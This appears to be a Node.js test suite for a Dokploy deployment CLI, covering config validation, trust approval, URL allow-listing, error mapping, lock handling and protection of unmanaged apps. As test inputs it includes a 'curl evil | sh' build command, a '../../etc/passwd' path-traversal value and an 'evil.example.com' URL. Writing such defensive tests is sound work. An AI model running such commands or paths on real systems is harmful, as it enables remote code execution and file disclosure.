import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { configHash, isTrusted, loadUserConfig, parseProjectConfig, trust, trustHash } from "../src/config.js";
import { DokployClient } from "../src/dokploy-client.js";
import { HsError, errorFromHttp } from "../src/errors.js";
import { mergeEnv, parseEnv } from "../src/env-file.js";
import { acquireLock } from "../src/lock.js";
import { Deployer } from "../src/deployer.js";

const good = { dokployProject: "hs-demo", app: "demo", subdomain: "demo", mode: "dockerfile", port: 8080 };

test("project config: valid, defaults, and clear rejections", () => {
  assert.equal(parseProjectConfig(good).port, 8080);
  assert.equal(parseProjectConfig({ ...good, mode: "static", outputDir: "dist", port: 1 }).port, 3000, "static mode always serves on 3000");
  const bad = [
    [{ ...good, mode: "weird" }, /mode/], [{ ...good, app: "Bad_Name" }, /app/], [{ ...good, port: 70000 }, /port/],
    [{ ...good, key: "abc" }, /unknown field/], [{ ...good, apiKey: "x" }, /unknown field/], [{ ...good, mode: "static" }, /outputDir/],
    [{ ...good, envFile: "../../etc/passwd" }, /relative path/], [{ ...good, dokployProject: "" }, /required/], [null, /JSON object/],
  ];
  for (const [obj, re] of bad) assert.throws(() => parseProjectConfig(obj), e => e instanceof HsError && re.test(e.message));
});

test("config hash is order independent; trust is per path and covers only the build command (D13)", () => {
  const udir = fs.mkdtempSync(path.join(os.tmpdir(), "hsd-trust-"));
  try {
    const a = parseProjectConfig(good);
    assert.equal(configHash(a), configHash(Object.fromEntries(Object.entries(a).reverse())));
    assert.equal(isTrusted("/proj", trustHash(a), udir), false);
    trust("/proj", trustHash(a), udir);
    assert.equal(isTrusted("/proj", trustHash(a), udir), true);
    assert.equal(isTrusted("/proj", trustHash({ ...a, subdomain: "other", port: 9, envFile: ".env.x" }), udir), true, "fields that cannot run code do not need a new approval");
    assert.equal(isTrusted("/proj", trustHash({ ...a, buildCommand: "curl evil | sh" }), udir), false, "a changed build command does");
    assert.equal(isTrusted("/other", trustHash(a), udir), false, "trust is bound to the folder");
  } finally { fs.rmSync(udir, { recursive: true, force: true }); }
});

test("user config: env overrides the file, bad url rejected", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hsd-user-"));
  try {
    fs.writeFileSync(path.join(dir, "config.json"), JSON.stringify({ url: "http://127.0.0.1:1", key: "k-file" }));
    assert.equal(loadUserConfig({ env: {}, dir }).url, "http://127.0.0.1:1");
    assert.equal(loadUserConfig({ env: { HSDEPLOY_URL: "http://127.0.0.1:2" }, dir }).url, "http://127.0.0.1:2");
    assert.throws(() => loadUserConfig({ env: { HSDEPLOY_URL: "ftp://x" }, dir }), /http/);
    for (const ok of ["http://100.114.91.58:3000", "http://127.0.0.1:3000", "http://localhost:3000", "http://dokploy:3000", "http://192.168.1.5", "http://172.20.0.2", "http://10.0.0.7", "http://box.tail1234.ts.net", "https://dokploy.example.com"]) {
      assert.equal(loadUserConfig({ env: { HSDEPLOY_URL: ok }, dir }).url, ok, ok);
    }
    for (const bad of ["http://evil.example.com", "http://8.8.8.8", "http://100.63.0.1", "http://172.32.0.1", "http://deploy-helper.example", "not a url"]) {
      assert.throws(() => loadUserConfig({ env: { HSDEPLOY_URL: bad }, dir }), e => e.kind === "usage", bad);
    }
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("error mapping by HTTP status, and the key never appears in a message", () => {
  const cases = [[401, "auth", 5], [403, "auth", 5], [404, "notfound", 1], [400, "invalid", 1], [500, "server", 1], [502, "server", 1], [418, "failed", 1]];
  for (const [status, kind, exit] of cases) { const e = errorFromHttp(status, "x.y", '{"message":"boom"}'); assert.equal(e.kind, kind); assert.equal(e.exitCode, exit); }
  assert.match(errorFromHttp(401, "x.y", '{"message":"Unauthorized"}').message, /revoked, expired or rate limited/);
});

test("client: timeout, network failure and auth errors are mapped; key is not leaked", async () => {
  const realFetch = globalThis.fetch;
  const SECRET = "SECRET-KEY-VALUE-1234567890";
  const client = new DokployClient({ url: "http://dokploy.test", key: SECRET, timeoutMs: 50 });
  const keepAlive = setInterval(() => {}, 20); // AbortSignal.timeout timers are unref'd; a real socket would keep the loop alive
  try {
    globalThis.fetch = (url, init) => new Promise((_, rej) => init.signal.addEventListener("abort", () => rej(Object.assign(new Error("aborted"), { name: "TimeoutError" }))));
    await assert.rejects(client.get("project.all"), e => e.kind === "timeout" && e.exitCode === 4 && !e.message.includes(SECRET));
    globalThis.fetch = async () => { throw Object.assign(new TypeError("fetch failed"), { cause: { code: "ECONNREFUSED" } }); };
    await assert.rejects(client.get("project.all"), e => e.kind === "network" && /ECONNREFUSED/.test(e.message) && !e.message.includes(SECRET));
    globalThis.fetch = async (url, init) => { assert.equal(init.headers["x-api-key"], SECRET); return new Response('{"message":"Unauthorized"}', { status: 401 }); };
    await assert.rejects(client.get("project.all"), e => e.kind === "auth" && !e.message.includes(SECRET));
  } finally { clearInterval(keepAlive); globalThis.fetch = realFetch; }
});

test("env merge keeps unrelated keys such as DATABASE_URL", () => {
  const merged = parseEnv(mergeEnv("DATABASE_URL=postgresql://u:p@h:5432/d\nOLD=1", parseEnv('NEW="two words"\nOLD=2\n# c\nexport X=3')));
  assert.equal(merged.get("DATABASE_URL"), "postgresql://u:p@h:5432/d");
  assert.equal(merged.get("OLD"), "2");
  assert.equal(merged.get("NEW"), "two words");
  assert.equal(merged.get("X"), "3");
});

test("lock: second run is refused while the first is alive, stale locks are taken over", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "hsd-lock-"));
  try {
    const release = acquireLock(dir);
    assert.throws(() => acquireLock(dir), e => e.kind === "refused");
    release();
    const r2 = acquireLock(dir); r2();
    fs.writeFileSync(path.join(dir, "deploy.lock"), JSON.stringify({ pid: 999999, startedAt: Date.now() }));
    acquireLock(dir, { isAlive: () => false })();
    fs.writeFileSync(path.join(dir, "deploy.lock"), JSON.stringify({ pid: process.pid, startedAt: Date.now() - 3 * 3600_000 }));
    acquireLock(dir)();
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("deployer refuses protected projects and apps it did not create, before any mutation", async () => {
  const calls = [];
  // project.all returns app SUMMARIES only (no appName, no description): the marker must come from application.one
  const projects = [
    { projectId: "p-infra", name: "infra", environments: [{ name: "production", environmentId: "e1", applications: [{ name: "cloudflared", applicationId: "a1" }] }] },
    { projectId: "p-hs", name: "hs-demo", environments: [{ name: "production", environmentId: "e2", applications: [{ name: "manual", applicationId: "a2" }, { name: "mine", applicationId: "a3" }] }] },
  ];
  const full = { a2: { name: "manual", applicationId: "a2", appName: "manual-x", description: "created by hand" }, a3: { name: "mine", applicationId: "a3", appName: "mine-y", description: "managed-by:hsdeploy" } };
  const client = new Proxy({ listProjects: async () => projects, getApp: async id => full[id] }, { get: (t, p) => t[p] ?? (async (...a) => { calls.push(p); return []; }) });
  const mk = cfg => new Deployer({ client, user: { baseDomain: "talabq.com", sshHost: "x" }, projectDir: ".", cfg: { port: 3000, mode: "dockerfile", subdomain: "s", ...cfg }, log: () => {} });
  await assert.rejects(mk({ dokployProject: "infra", app: "cloudflared" }).load(), e => e.kind === "refused");
  const d = await mk({ dokployProject: "hs-demo", app: "manual" }).load();
  await assert.rejects(d.down(), e => e.kind === "refused" && /not created by hsdeploy/.test(e.message));
  await assert.rejects(d.ensureApp(), e => e.kind === "refused");
  assert.deepEqual(calls, [], "no mutating call was made after the policy refused");
  const mine = await mk({ dokployProject: "hs-demo", app: "mine" }).load();
  const app = await mine.ensureApp();
  assert.equal(app.appName, "mine-y", "the full app (with appName) is used, not the summary");
  assert.deepEqual(calls, [], "a managed app is accepted without creating anything");
});
